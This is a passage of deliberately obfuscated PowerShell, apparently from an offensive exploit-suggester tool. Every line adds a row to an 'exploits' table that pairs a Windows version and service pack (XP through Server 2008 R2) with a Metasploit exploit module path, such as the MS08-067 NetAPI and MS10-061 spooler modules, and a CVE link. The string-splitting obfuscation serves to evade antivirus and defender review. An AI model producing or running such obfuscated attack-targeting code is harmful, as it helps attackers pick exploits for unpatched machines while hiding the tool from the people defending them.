    ${nU`LL} = ${t`AbL`eeXPLoiTS}."Ro`wS".("{1}{0}"-f 'dd','A')."i`NvOke"(("{1}{2}{3}{0}"-f ("{0}{1}"-f 'r 20','03'),("{1}{0}"-f'indo','W'),("{1}{0}" -f 'Se','ws '),'rve'),("{1}{2}{0}" -f ("{2}{0}{1}" -f'Pa','ck 1',' '),'Ser','ver'),("{1}{2}{6}{4}{3}{5}{0}{7}" -f("{0}{1}{2}"-f'6_06','6','_n'),'exp','loi',("{0}{1}"-f 'w','s/sm'),("{1}{0}" -f 'ndo','i'),("{1}{0}"-f '/ms0','b'),'t/w',("{1}{0}" -f 'i','wap')),("{0}{9}{8}{3}{5}{4}{6}{7}{2}{1}" -f("{1}{2}{0}" -f 'w','ht','tp://w'),("{0}{1}" -f'-468','8'),("{0}{1}"-f '20','06'),("{1}{2}{0}"-f 'detai','cv','e'),("{0}{1}" -f 'com/','c'),'ls.','ve','/','.','w'))  
    ${N`UlL} = ${T`AbL`E`eX`PloIts}."Ro`Ws".("{0}{1}"-f'Ad','d')."i`N`VoKe"(("{2}{0}{3}{1}"-f ("{0}{1}" -f 's',' Se'),'003',("{0}{1}{2}"-f 'Wi','n','dow'),("{1}{0}"-f'2','rver ')),("{1}{2}{4}{0}{3}"-f ' ',("{1}{0}" -f 've','Ser'),("{1}{0}"-f'a','r P'),'1','ck'),("{4}{0}{2}{6}{3}{1}{5}" -f 'lo',("{2}{0}{1}" -f'_067_ne','ta','08'),("{1}{0}" -f'/w','it'),'/ms','exp','pi',("{1}{0}{2}" -f'ws/s','indo','mb')),("{5}{1}{8}{7}{0}{10}{9}{4}{2}{3}{6}" -f ("{0}{1}" -f 'eta','i'),':/','-','4','008',("{1}{0}"-f 'p','htt'),'250','d',("{0}{2}{1}"-f'/www','cve','.'),("{0}{1}{2}" -f'm/c','ve/','2'),("{0}{1}" -f'ls.c','o')))  
    ${N`ULL} = ${taBlEEX`pL`O`ITS}."r`OWs".("{0}{1}" -f'A','dd')."iN`VOKE"(("{5}{2}{1}{0}{4}{3}" -f 'v','er',("{0}{1}" -f'dows ','S'),'003',("{0}{1}" -f 'er',' 2'),'Win'),("{1}{3}{0}{2}"-f 've','Se',("{0}{2}{1}"-f 'r','ck 1',' Pa'),'r'),("{2}{8}{5}{6}{7}{0}{3}{9}{1}{4}"-f 'n','_04','e',("{1}{0}"-f '/ms0','s'),("{0}{1}"-f'5','_wins'),'t',("{2}{0}{1}" -f'indows','/w','/w'),'i',("{1}{0}" -f 'i','xplo'),'4'),("{6}{3}{1}{0}{5}{4}{2}" -f("{0}{1}{2}" -f'/cve','/2','0'),("{1}{2}{3}{0}"-f '.com','ww.cvedeta','il','s'),'0/',("{0}{1}"-f'tp://','w'),'8',("{0}{1}" -f '04','-10'),'ht'))  
    ${n`UlL} = ${taB`Le`eX`plO`ITS}."RO`WS".("{1}{0}" -f'dd','A')."I`NVOke"(("{2}{1}{4}{5}{6}{0}{3}" -f ("{1}{0}"-f' 2','ver'),'ind','W','003','o',("{0}{1}"-f'ws S','e'),'r'),("{1}{2}{0}"-f("{0}{2}{1}" -f 'e',' 2',' Pack'),("{0}{1}"-f'Se','rvi'),'c'),("{4}{7}{5}{8}{3}{0}{2}{6}{1}"-f ("{0}{2}{1}"-f '/','s07_029_','m'),'me','m',("{0}{1}" -f 'er','pc'),("{0}{1}" -f 'expl','oi'),("{0}{1}"-f'/wi','nd'),("{0}{2}{1}" -f 's','onena','dns_z'),'t',("{0}{1}"-f'ows','/dc')),("{2}{5}{1}{0}{6}{3}{8}{7}{4}"-f ("{0}{1}{2}" -f 'ww','.cve','d'),'/w','h',("{0}{2}{1}" -f 'ta','com/c','ils.'),("{1}{0}"-f '48','17'),("{0}{1}"-f'ttp',':/'),'e',("{1}{0}" -f '007-','2'),'ve/'))  
    ${NU`Ll} = ${Tab`L`eEx`p`loITs}."R`ows".("{1}{0}" -f 'd','Ad')."inv`Oke"(("{3}{4}{1}{2}{0}" -f'3',("{2}{0}{1}"-f'er',' 2',' Serv'),'00','Win',("{1}{0}"-f 'ows','d')),("{1}{0}{2}{3}"-f("{0}{1}" -f'rvic','e'),'Se',("{0}{1}" -f' Pac','k'),' 2'),("{8}{3}{9}{6}{1}{4}{5}{0}{2}{7}" -f ("{0}{1}"-f'7','_ne'),'08_','t','/w','0','6',("{2}{0}{1}{3}"-f'ows/','smb/','d','ms'),'api',("{0}{1}"-f 'explo','it'),'in'),("{4}{0}{5}{7}{6}{3}{1}{2}" -f 'ttp','0',("{0}{1}{2}" -f '8-42','5','0'),("{2}{1}{0}"-f'20','ve/','/c'),'h',("{0}{1}"-f'://','w'),("{3}{1}{2}{0}{4}" -f 'i','cvede','ta','w.','ls.com'),'w'))  
    ${N`Ull} = ${tAbleexP`l`oI`Ts}."R`owS".("{0}{1}"-f'A','dd')."I`NV`oKe"(("{0}{5}{4}{2}{3}{1}" -f ("{0}{1}{2}" -f'W','indows ','Se'),'3','2','00','r ','rve'),("{3}{2}{0}{1}" -f 'ic',("{1}{0}{2}"-f ' P','e','ack 2'),'v','Ser'),("{0}{7}{9}{5}{10}{6}{1}{3}{4}{2}{8}" -f("{3}{1}{0}{2}" -f 'it','lo','/wi','exp'),("{1}{0}" -f'1_s','06'),'ls','p','oo','m',("{0}{1}" -f 's10','_'),("{0}{1}" -f 'n','dows/'),'s','s','b/m'),("{6}{2}{5}{4}{3}{0}{1}"-f ("{0}{1}"-f'/20','10'),("{0}{1}"-f'-27','29'),'t',("{1}{0}{2}{3}"-f '.c','ils','o','m/cve'),("{0}{1}"-f 'ed','eta'),("{1}{0}{2}{3}" -f'w','tp://w','w.c','v'),'h'))  
    ${N`Ull} = ${TAbl`EeXP`LO`its}."r`OWS".("{1}{0}" -f 'dd','A')."inv`OkE"(("{0}{3}{4}{1}{2}{5}" -f ("{0}{1}"-f'W','ind'),'rve',("{0}{1}" -f'r 2','0'),("{0}{1}" -f 'o','ws '),'Se','03'),"",("{0}{2}{8}{4}{6}{5}{3}{7}{1}" -f ("{1}{0}" -f'xpl','e'),("{2}{1}{0}" -f'm','o','6_dc'),("{0}{1}" -f'oit/','win'),'03_','dc','s',("{1}{0}"-f'm','erpc/'),'02',("{0}{1}" -f 'dows','/')),("{5}{6}{4}{3}{0}{2}{1}"-f("{1}{0}"-f '03','20'),'/',("{0}{1}" -f'-035','2'),("{1}{0}"-f'/cve/','m'),("{2}{1}{0}" -f 'o','ails.c','et'),("{1}{2}{0}"-f'www','h','ttp://'),("{1}{0}"-f 'd','.cve')))  
    ${N`UlL} = ${Ta`BLeeXp`Lo`Its}."Ro`Ws".("{0}{1}"-f'A','dd')."I`NVo`kE"(("{2}{3}{1}{0}{4}"-f' 20',("{1}{0}" -f 'er','rv'),("{0}{1}" -f 'W','indo'),("{1}{0}" -f'e','ws S'),'03'),"",("{3}{0}{1}{4}{6}{2}{5}"-f ("{0}{1}" -f'lo','it/'),("{1}{0}{2}" -f 'indows/','w','smb'),("{1}{0}"-f '4','s06_0'),'exp','/',("{0}{2}{1}"-f'0_ne','api','t'),'m'),("{10}{0}{1}{3}{5}{8}{7}{9}{2}{11}{4}{6}" -f '://','ww',("{0}{1}"-f 'v','e/200'),("{1}{0}" -f 't','w.cvede'),'3','a','439','com',("{1}{0}" -f'ls.','i'),'/c',("{1}{0}"-f 'ttp','h'),'6-'))  
    ${Nu`ll} = ${tA`B`lEe`XPlOits}."R`OWs".("{1}{0}"-f'd','Ad')."i`NvO`KE"(("{0}{3}{1}{2}" -f ("{2}{0}{1}" -f 'i','ndows ','W'),'2','003',("{0}{1}{2}" -f 'Ser','ver',' ')),"",("{0}{3}{5}{1}{6}{2}{4}" -f 'e',("{1}{0}" -f'ws/sm','o'),'8_0','xp',("{1}{0}" -f'i','67_netap'),("{0}{1}" -f 'l','oit/wind'),("{1}{0}"-f '0','b/ms')),("{1}{3}{7}{0}{5}{4}{2}{6}"-f 'e','h','008',("{1}{0}{2}"-f 'p://','tt','www.'),("{1}{0}"-f've/2','c'),("{3}{0}{2}{1}"-f 'c','m/','o','details.'),("{0}{1}"-f'-42','50'),'cv'))  
    ${n`ULl} = ${TabLEe`XPLo`i`Ts}."R`OWS".("{1}{0}"-f 'dd','A')."i`NVOkE"(("{3}{1}{0}{2}"-f("{0}{1}{2}" -f'e','rver',' 200'),'s S','3',("{0}{1}" -f'Win','dow')),"",("{9}{6}{10}{7}{0}{4}{2}{1}{3}{5}{8}" -f '/w',("{1}{0}"-f'04','s/ms'),'n',("{0}{1}"-f'_','045'),'i','_wi',("{1}{0}"-f'it/w','o'),("{0}{1}"-f'd','ows'),'ns',("{1}{0}"-f 'xpl','e'),'in'),("{2}{4}{7}{1}{0}{3}{5}{6}" -f ("{1}{0}"-f'c','ls.'),'i',("{0}{1}"-f 'h','ttp:'),'om',("{0}{1}{2}" -f '//','ww','w.'),("{3}{0}{1}{2}" -f 'e/2','0','04-108','/cv'),'0/',("{1}{0}" -f'a','cvedet')))  
    ${nU`Ll} = ${T`Ab`lEExP`LOI`TS}."R`OWS".("{0}{1}" -f 'A','dd')."I`NVO`Ke"(("{2}{4}{6}{0}{3}{1}{5}" -f 'o',' Se','W','ws','i',("{2}{3}{1}{0}"-f '3 R2','er 200','r','v'),'nd'),"",("{2}{6}{7}{5}{0}{9}{8}{3}{1}{4}"-f("{0}{1}"-f's/','dce'),'03',("{1}{0}"-f'l','exp'),'s',("{1}{0}" -f 'om','_026_dc'),'w',("{0}{2}{1}" -f 'oi','/win','t'),'do','c/m','rp'),("{8}{6}{4}{9}{5}{2}{3}{0}{1}{7}"-f("{0}{1}" -f 'c','ve/2'),'0',("{1}{0}"-f 'ls','ai'),("{1}{0}"-f 'om/','.c'),'c','et',("{0}{1}{2}"-f 'ttp',':','//www.'),("{1}{0}" -f '52/','03-03'),'h','ved'))  
    ${N`Ull} = ${TAbLEE`X`PLoI`TS}."ro`ws".("{0}{1}" -f'A','dd')."i`NvoKE"(("{0}{5}{4}{1}{2}{3}"-f'Wi','erv',("{0}{1}" -f 'er 2','00'),("{1}{0}"-f ' R2','3'),' S',("{0}{1}"-f 'ndow','s')),"",("{5}{8}{3}{2}{6}{0}{7}{1}{4}" -f("{1}{0}" -f'_0','s04'),("{1}{0}" -f'sas','_l'),'/','smb','s',("{0}{1}{3}{2}"-f'e','xploit/','indo','w'),'m','11','ws/'),("{5}{6}{1}{0}{7}{2}{3}{4}" -f 'o',("{1}{0}"-f'ls.c','detai'),("{2}{1}{0}"-f '-05','ve/2003','c'),'3','3/','h',("{2}{1}{0}{3}" -f'ww','://w','ttp','.cve'),'m/'))  
    ${N`UlL} = ${TA`BLee`XpL`oITs}."r`OWS".("{0}{1}"-f'Ad','d')."inV`O`ke"(("{0}{4}{2}{3}{1}"-f 'Wi',("{0}{1}" -f '0','3 R2'),("{2}{1}{0}"-f'e','ws Serv','o'),("{1}{0}" -f'20','r '),'nd'),"",("{7}{3}{8}{1}{9}{4}{6}{10}{5}{0}{2}"-f 'tap','/','i',("{2}{1}{0}"-f 's','dow','t/win'),("{1}{0}" -f '6_0','0'),'_ne','4',("{1}{0}" -f'i','explo'),("{0}{1}"-f '/','smb'),'ms','0'),("{0}{7}{8}{3}{4}{2}{1}{10}{5}{9}{6}{11}" -f("{1}{0}"-f'ttp','h'),("{0}{1}"-f 't','ails'),'e',("{0}{1}"-f'/','www'),("{0}{1}" -f'.c','ved'),("{1}{0}"-f 've','/c'),("{0}{1}" -f'06','-34'),':','/','/20',("{1}{0}"-f 'om','.c'),'39'))  
    ${N`ULL} = ${tAb`LeexP`lo`Its}."R`oWS".("{0}{1}" -f 'Ad','d')."i`NVOkE"(("{1}{3}{0}{6}{4}{2}{5}"-f 'Ser',("{0}{1}"-f'W','indows'),' ',' ','03','R2',("{0}{1}"-f 'ver',' 20')),"",("{5}{4}{0}{3}{6}{2}{1}" -f's',("{1}{0}"-f's','045_win'),("{1}{2}{0}" -f'04_','s/m','s'),'/wi',("{0}{1}"-f'win','dow'),("{0}{1}" -f'explo','it/'),'n'),("{9}{7}{11}{1}{4}{5}{3}{2}{10}{8}{0}{6}" -f'-1','//w','i',("{2}{0}{1}"-f 't','a','cvede'),'w','w.',("{1}{0}"-f'0/','08'),'tp','04','ht',("{0}{2}{1}" -f 'ls.','e/20','com/cv'),':'))  
    ${n`UlL} = ${tabLe`eX`PLoi`Ts}."RO`Ws".("{1}{0}"-f 'd','Ad')."i`N`VoKE"(("{0}{2}{3}{1}"-f'Win',("{0}{1}" -f' 20','08'),("{0}{1}"-f'dows',' S'),("{1}{0}"-f 'r','erve')),("{0}{2}{3}{1}" -f 'S',("{1}{0}{2}"-f ' Pa','e','ck 2'),'erv','ic'),("{4}{3}{9}{7}{10}{2}{12}{5}{6}{11}{8}{1}{0}"-f 'x',("{1}{0}"-f 'de','_in'),("{2}{1}{0}"-f '_ne','2','_smb'),("{0}{1}"-f 'lo','it'),'exp',("{0}{1}" -f 'oti','a'),'t',("{0}{1}{2}"-f 'd','o','ws/smb/'),("{1}{0}"-f'nc','fu'),("{1}{0}" -f 'n','/wi'),("{1}{0}{2}" -f'09_05','ms','0'),'e_','g'),("{8}{4}{2}{9}{3}{5}{7}{10}{1}{0}{6}" -f'09-','20',("{1}{0}"-f 'eta','ed'),("{0}{1}"-f 'com','/c'),'.cv','v',("{1}{0}"-f'103','3'),'e',("{3}{2}{0}{1}"-f'://','www','ttp','h'),("{0}{1}" -f 'i','ls.'),'/'))  
    ${N`ULl} = ${TablE`E`XP`L`oItS}."ro`wS".("{1}{0}"-f 'dd','A')."invo`ke"(("{1}{2}{0}{3}" -f("{1}{0}"-f 've','Ser'),("{0}{1}"-f'Win','d'),("{0}{1}"-f'o','ws '),("{2}{0}{1}"-f' ','2008','r')),("{1}{4}{0}{2}{3}"-f("{0}{1}"-f 'ice',' P'),'S',("{1}{0}" -f 'ck ','a'),'2','erv'),("{7}{3}{8}{0}{5}{6}{1}{2}{4}" -f("{0}{1}"-f'i','ndo'),'0_','0','xp',("{2}{1}{0}"-f'oolss','sp','61_'),'ws',("{1}{2}{0}" -f 'ms1','/s','mb/'),'e',("{1}{2}{0}" -f 'w','loi','t/')),("{3}{0}{1}{2}{4}{5}{6}" -f("{1}{0}"-f'/ww','p:/'),("{2}{0}{1}" -f'cve','detai','w.'),'l','htt',("{2}{0}{1}" -f'c','om/cve/','s.'),("{1}{0}"-f '010','2'),("{1}{0}" -f'29','-27')))  
    ${n`ULL} = ${ta`BLee`x`plOi`TS}."R`oWs".("{0}{1}" -f'Ad','d')."i`NvOKE"(("{2}{1}{3}{0}" -f ("{1}{0}" -f '08','20'),("{2}{1}{0}" -f'ver','s Ser','dow'),'Win',' '),"",("{8}{3}{6}{2}{9}{1}{4}{7}{5}{0}" -f'i',("{0}{2}{1}"-f 'b/ms08','06','_'),("{0}{1}"-f '/wi','ndo'),'o',("{1}{0}"-f't','7_ne'),'p','it','a',("{1}{0}" -f'pl','ex'),("{1}{0}" -f'/sm','ws')),("{9}{11}{10}{1}{0}{3}{8}{2}{4}{6}{5}{7}" -f ("{0}{1}" -f 'ai','ls.c'),("{0}{3}{2}{1}"-f '/w','t','.cvede','ww'),'008','o','-','2','4','50',("{0}{1}" -f'm','/cve/2'),("{1}{0}" -f 'ttp','h'),'/',':'))  
    ${N`UlL} = ${Ta`BL`eEx`ploItS}."rO`wS".("{1}{0}" -f 'dd','A')."i`NVo`ke"(("{0}{5}{2}{1}{4}{3}"-f'W',("{1}{0}"-f 'er 2','v'),("{2}{0}{1}"-f's ','Ser','dow'),'8','00','in'),"",("{2}{8}{9}{1}{6}{5}{4}{0}{7}{3}" -f'e',("{1}{0}" -f '0','_05'),'ex','x',("{0}{1}" -f'gotia','t'),'_ne',("{0}{1}" -f '_','smb2'),("{2}{1}{0}" -f'de','n','_func_i'),'plo',("{1}{0}{2}{3}" -f 'ws','it/windo','/smb/','ms09')),("{1}{4}{5}{0}{8}{2}{6}{7}{9}{3}{10}" -f'w',("{0}{1}" -f'htt','p'),("{1}{0}"-f 'ai','et'),("{1}{0}{2}{4}{3}"-f'v','om/c','e/200','31','9-'),':/','/','l','s.',("{1}{2}{0}"-f'.cved','w','w'),'c','03'))  
    ${nU`lL} = ${tAb`lEE`xP`loiTs}."rO`wS".("{0}{1}" -f 'Ad','d')."invo`KE"(("{2}{3}{5}{0}{1}{4}" -f 'Se','rv',("{1}{0}" -f 'ow','Wind'),'s',("{0}{2}{1}"-f'er 2','8','00'),' '),"",("{1}{2}{4}{6}{7}{3}{0}{8}{5}"-f("{0}{1}"-f'1','_sp'),("{1}{0}" -f 'plo','ex'),("{2}{0}{1}"-f't/','windo','i'),'6',("{1}{0}"-f'/s','ws'),'s',("{0}{1}"-f'm','b/ms'),("{0}{1}" -f '10','_0'),("{1}{0}" -f 'ls','oo')),("{5}{7}{2}{1}{6}{3}{11}{4}{8}{9}{10}{0}" -f'29',("{0}{1}" -f'.cv','e'),'ww',("{0}{1}"-f 'il','s.c'),'ve/',("{1}{0}"-f'ttp:/','h'),("{0}{1}" -f 'd','eta'),'/w',("{0}{1}"-f '2010','-'),'2','7',("{1}{0}" -f 'm/c','o')))  
    ${nU`Ll} = ${T`AB`LEEXPL`OI`TS}."RO`ws".("{0}{1}" -f 'A','dd')."I`NvOKE"(("{2}{4}{3}{0}{1}" -f("{0}{1}"-f'r ','20'),("{0}{1}"-f'08 R','2'),("{0}{1}"-f 'W','indows '),("{1}{0}"-f 've','er'),'S'),"",("{10}{5}{7}{1}{8}{0}{2}{6}{3}{4}{9}" -f 'ow','/',("{1}{0}" -f '/m','s/smb'),'10_',("{1}{0}{2}"-f'6','0','1_spoo'),'pl','s','oit',("{1}{0}" -f 'ind','w'),'lss','ex'),("{4}{1}{2}{7}{3}{5}{0}{6}{8}" -f ("{1}{0}" -f '0','e/2'),("{0}{1}" -f ':/','/w'),("{0}{2}{1}"-f'w','det','w.cve'),'s.',("{0}{1}" -f 'h','ttp'),("{1}{0}" -f'/cv','com'),'10','ail',("{1}{0}"-f'2729','-')))  
    ${n`ULL} = ${tAbL`Eex`pl`OITs}."RO`wS".("{1}{0}"-f'd','Ad')."inv`okE"(("{0}{1}{3}{2}"-f ("{0}{1}" -f 'Wind','o'),("{0}{1}"-f 'ws',' Vi'),'a','st'),("{1}{0}{2}"-f("{0}{2}{1}" -f'er','er ','v'),'S',("{1}{2}{0}"-f 'k 1','Pa','c')),("{2}{4}{8}{3}{0}{6}{9}{1}{7}{5}" -f("{0}{1}" -f'n','dow'),'m',("{0}{1}" -f 'ex','pl'),("{0}{1}" -f 't','/wi'),'o',("{1}{4}{3}{2}{0}"-f 'etapi','08','67_n','0','_'),'s/s','s','i','mb/'),("{4}{2}{3}{5}{0}{1}{6}"-f("{2}{1}{0}"-f '/','m/cve','o'),("{1}{0}" -f '5','2008-42'),'w.',("{1}{0}{2}" -f'et','cved','ails'),("{1}{2}{0}"-f'w','htt','p://w'),'.c','0'))  
    ${Nu`ll} = ${T`Abl`ee`X`pLoITs}."r`Ows".("{1}{0}"-f'd','Ad')."I`NVoke"(("{2}{1}{0}"-f'sta',("{2}{0}{1}" -f'ws ','Vi','do'),'Win'),("{1}{2}{0}"-f'1',("{1}{0}" -f 'rve','Se'),("{1}{0}"-f'k ','r Pac')),("{7}{0}{13}{4}{5}{2}{1}{9}{6}{11}{8}{14}{12}{10}{3}" -f'plo','ws','o',("{2}{0}{1}" -f'i','ndex','nc_'),'t/',("{1}{0}"-f 'ind','w'),("{1}{0}" -f 'mb/','s'),'ex','_','/',("{0}{1}" -f'te_','fu'),("{2}{1}{0}{3}"-f'_050_s','09','ms','mb2'),("{0}{1}"-f'ot','ia'),'i','neg'),("{3}{5}{2}{9}{4}{7}{6}{0}{8}{1}"-f ("{1}{0}"-f'00','e/2'),'103','/w','ht',("{0}{1}"-f 'd','etail'),("{0}{1}" -f'tp',':/'),("{0}{1}" -f'm','/cv'),("{0}{1}"-f 's','.co'),'9-3',("{0}{1}"-f'ww.cv','e')))  
    ${NU`LL} = ${T`ABL`ee`Xploi`Ts}."ro`Ws".("{1}{0}" -f 'd','Ad')."In`V`oKE"(("{3}{0}{2}{1}" -f 'i',("{0}{1}"-f' V','ista'),("{1}{0}"-f'dows','n'),'W'),("{1}{2}{3}{0}" -f '1','S','er',("{0}{1}"-f 'v','er Pack ')),("{1}{6}{8}{7}{3}{5}{2}{4}{0}" -f ("{1}{0}"-f 'lss','o'),'e',("{0}{1}" -f '_06','1_s'),("{1}{2}{0}"-f 'b/ms1','/s','m'),'po','0',("{2}{1}{0}"-f'i','w','xploit/'),'s',("{1}{0}" -f 'w','ndo')),("{6}{0}{1}{4}{7}{3}{5}{2}" -f'w',("{2}{1}{0}"-f'etai','.cved','w'),'9',("{1}{2}{0}" -f '0-','m/cve/','201'),'l','272',("{1}{0}{2}"-f'p:','htt','//w'),("{0}{1}" -f's.c','o')))  
    ${nu`Ll} = ${TABlE`E`xP`L`oItS}."Ro`Ws".("{0}{1}"-f 'A','dd')."iNv`oKe"(("{2}{0}{1}"-f 'ws ',("{1}{0}" -f'ta','Vis'),("{1}{0}"-f'ndo','Wi')),("{0}{2}{3}{4}{1}" -f'Se',' 2','rv',("{1}{0}" -f 'ce ','i'),("{1}{0}" -f'k','Pac')),("{10}{0}{11}{7}{1}{12}{2}{3}{5}{6}{8}{9}{4}" -f ("{1}{0}" -f'loit','p'),("{2}{1}{0}"-f 'b/m','sm','s/'),("{1}{0}"-f'0_s','09_05'),'mb2',("{0}{2}{1}" -f 'n','_index','c'),'_ne',("{0}{1}" -f 'go','ti'),("{0}{1}" -f 'n','dow'),("{1}{0}"-f 'te_','a'),'fu','ex','/wi','s'),("{5}{3}{2}{0}{7}{8}{4}{6}{1}"-f("{1}{0}" -f'det','cve'),'3','.',("{0}{2}{3}{1}" -f 'ttp:','w','//w','w'),'2','h',("{2}{1}{0}" -f'10','09-3','0'),("{0}{1}" -f 'a','ils'),("{1}{2}{0}" -f 'e/','.com','/cv')))  
    ${n`UlL} = ${tAb`L`EExP`l`oits}."r`oWS".("{0}{1}"-f 'A','dd')."i`NVoKe"(("{2}{1}{0}{3}"-f 'n','i','W',("{0}{1}{3}{2}"-f'dows ','V','a','ist')),("{2}{1}{0}"-f 'k 2','Pac',("{0}{1}"-f'Se','rvice ')),("{5}{0}{2}{6}{10}{1}{8}{3}{9}{7}{4}" -f ("{0}{1}" -f'plo','i'),'6',("{1}{0}"-f'nd','t/wi'),'s','ss','ex',("{0}{1}"-f 'ows/s','mb/'),'l','1_','poo',("{2}{1}{0}" -f'10_0','s','m')),("{1}{6}{5}{8}{4}{7}{0}{9}{10}{11}{2}{3}"-f 'co','ht','/',("{1}{0}" -f '010-2729','2'),'l',("{1}{2}{0}"-f 'ved','www','.c'),("{1}{0}" -f'//','tp:'),'s.',("{1}{0}"-f 'tai','e'),'m','/','cve'))  
    ${nu`lL} = ${TAB`l`eEXpL`oiTs}."Ro`ws".("{1}{0}" -f 'dd','A')."InvO`kE"(("{2}{1}{0}" -f 'sta',("{2}{1}{0}"-f'Vi','s ','indow'),'W'),"",("{2}{1}{7}{9}{0}{8}{4}{3}{6}{5}"-f("{0}{1}{2}" -f '/w','indo','ws'),'xp','e','s0',("{0}{1}"-f 'mb','/m'),("{1}{0}"-f 'api','t'),("{0}{1}{2}" -f'8_0','67_n','e'),'lo','/s','it'),("{6}{2}{1}{4}{5}{3}{0}" -f("{0}{1}" -f'-','4250'),("{0}{1}"-f'cved','e'),("{1}{2}{0}"-f 'w.','p','://ww'),'008','tai',("{0}{1}{2}"-f'ls.com/','cv','e/2'),'htt'))  
    ${Nu`LL} = ${TaBlee`xpL`OIts}."rO`ws".("{1}{0}" -f'dd','A')."in`VOkE"(("{4}{3}{0}{1}{2}"-f 'Vi','st','a',("{0}{1}" -f'o','ws '),("{1}{0}" -f'ind','W')),"",("{9}{5}{8}{4}{7}{3}{1}{0}{2}{6}"-f'iat','t',("{1}{0}" -f '_fun','e'),("{2}{0}{1}"-f '_neg','o','_smb2'),'s',("{2}{0}{4}{1}{3}"-f'oit/w','s/','pl','sm','indow'),("{0}{1}" -f'c_','index'),("{1}{0}" -f'050','09_'),'b/m','ex'),("{10}{2}{0}{7}{5}{8}{3}{9}{1}{6}{4}"-f'v',("{0}{1}" -f '09-','31'),("{1}{0}" -f'www.c','p://'),("{1}{0}{2}" -f 'ils.com/','ta','cv'),'3','d','0','e','e',("{0}{1}"-f'e/','20'),'htt'))  
    ${n`UlL} = ${taB`leExplO`iTS}."rO`wS".("{1}{0}"-f'd','Ad')."In`V`oKE"(("{2}{0}{1}"-f 'n',("{1}{2}{0}"-f 'XP','dow','s '),'Wi'),("{0}{2}{3}{1}" -f'Se','k 1',("{0}{1}" -f 'rver P','a'),'c'),("{4}{2}{3}{0}{1}{6}{5}"-f 'loi','t/w','x','p','e',("{1}{0}"-f 'com','_d'),("{3}{2}{5}{4}{1}{0}{6}"-f '02','3_','nd','i','ws/dcerpc/ms0','o','6')),("{6}{7}{0}{2}{5}{8}{1}{4}{3}"-f'ed','0',("{1}{0}" -f 's','etail'),("{0}{1}" -f '3-035','2/'),'0',("{1}{0}" -f'com/cv','.'),'h',("{2}{3}{1}{0}" -f 'www.cv','://','t','tp'),'e/2'))  
    ${nU`ll} = ${TAbl`eEXP`l`oitS}."r`oWS".("{0}{1}" -f'A','dd')."IN`VoKE"(("{1}{0}{2}" -f ("{0}{1}" -f 'dow','s'),'Win',' XP'),("{4}{0}{3}{2}{1}" -f'e',("{0}{1}"-f' Pac','k 1'),'er','rv','S'),("{4}{7}{6}{5}{8}{1}{0}{2}{3}"-f ("{1}{0}"-f '_m','17'),("{1}{0}" -f'_0','s05'),'sm','q',("{0}{1}"-f'ex','ploit'),("{1}{0}{2}{3}"-f 'dow','in','s/dc','erpc/'),'w','/','m'),("{1}{7}{8}{2}{0}{4}{5}{6}{3}"-f ("{0}{1}" -f 'a','ils.com'),'ht',("{1}{2}{0}{3}"-f'cve','ww','.','det'),'59','/','c',("{2}{1}{0}" -f'5-00','00','ve/2'),("{0}{1}"-f 'tp','://'),'w'))  
    ${N`UlL} = ${Ta`BleExPl`Oi`TS}."Ro`Ws".("{0}{1}" -f'A','dd')."I`NvOkE"(("{1}{0}{3}{2}" -f'o',("{0}{1}" -f 'Win','d'),'P',("{0}{1}"-f'ws',' X')),("{2}{3}{1}{0}{4}" -f'ac',("{0}{1}"-f 'er ','P'),'Se','rv','k 1'),("{6}{3}{1}{2}{4}{5}{0}"-f'ss',("{1}{2}{0}" -f 's/smb','t/windo','w'),("{1}{0}" -f'ms0','/'),'oi','4',("{1}{2}{0}"-f'sa','_011_','l'),("{0}{1}" -f 'e','xpl')),("{10}{7}{1}{4}{2}{9}{0}{6}{3}{8}{11}{5}" -f 'ils','/','ede','o',("{1}{0}" -f '.cv','/www'),("{1}{0}"-f'33/','3-05'),'.c',("{0}{1}" -f 'tt','p:'),("{0}{1}" -f'm/c','ve/'),'ta','h','200'))  
    ${N`UlL} = ${TAb`LEExplO`i`TS}."R`Ows".("{0}{1}" -f'A','dd')."InV`okE"(("{0}{1}{2}" -f'W',("{0}{1}" -f 'ind','o'),("{1}{0}"-f' XP','ws')),("{1}{0}{2}{3}" -f' Pa',("{0}{1}" -f 'Ser','ver'),'ck ','1'),("{3}{0}{5}{2}{1}{4}" -f("{2}{1}{0}"-f'ms05','b/','s/sm'),'3','0',("{2}{1}{3}{0}"-f 'dow','/w','exploit','in'),("{0}{1}"-f'9_p','np'),'_'),("{0}{7}{6}{5}{3}{2}{4}{1}"-f ("{2}{0}{1}" -f 'ttp','://','h'),'3','/','om',("{0}{1}{2}{3}"-f 'cve','/2','005-','198'),("{1}{0}" -f's.c','l'),'tai',("{1}{2}{0}" -f 'vede','ww','w.c')))  
    ${n`UlL} = ${TAb`lEexPlO`iTs}."RO`ws".("{0}{1}" -f 'A','dd')."In`V`okE"(("{2}{0}{1}"-f ("{0}{1}"-f 'ows',' '),'XP',("{0}{1}" -f'Wi','nd')),("{0}{3}{1}{2}"-f ("{1}{0}"-f 'rver','Se'),'ack',' 1',' P'),("{10}{5}{4}{3}{9}{7}{2}{8}{6}{0}{1}"-f 'p','i',("{0}{1}{2}"-f'mb/m','s06_','04'),("{0}{1}"-f 'indo','w'),("{1}{0}" -f 'w','oit/'),'l','a','/s',("{0}{1}" -f'0_ne','t'),'s','exp'),("{3}{7}{2}{5}{0}{8}{6}{1}{4}{9}" -f 'ta','om','c',("{0}{1}" -f'htt','p:'),("{2}{1}{0}"-f '-3','006','/cve/2'),("{1}{0}"-f'ede','v'),("{0}{1}"-f 'ls','.c'),("{0}{1}{2}"-f '//w','ww','.'),'i','439'))  
    ${nu`lL} = ${taBL`E`eXploITs}."ro`ws".("{0}{1}"-f'Ad','d')."i`NvoKE"(("{0}{1}{2}" -f ("{1}{0}"-f'nd','Wi'),("{1}{0}"-f' X','ows'),'P'),("{0}{1}{2}" -f 'Se',("{0}{1}" -f'rv','ic'),("{1}{0}" -f 'k 2','e Pac')),("{2}{5}{3}{6}{9}{4}{1}{7}{8}{0}"-f'smq',("{0}{1}"-f 'ow','s/'),'e','pl',("{1}{0}" -f 'd','win'),'x','oi',("{0}{1}{3}{2}"-f 'dc','e','s05_017_','rpc/m'),'m','t/'),("{7}{2}{0}{9}{4}{5}{6}{8}{3}{1}{10}"-f("{1}{0}" -f'ed','cv'),'00',("{1}{0}" -f '/www.','/'),("{1}{0}"-f'05-','0'),'.',("{1}{0}"-f 'om/','c'),("{0}{1}"-f'cve','/'),("{1}{0}"-f 'p:','htt'),'2',("{0}{1}"-f 'et','ails'),'59'))  
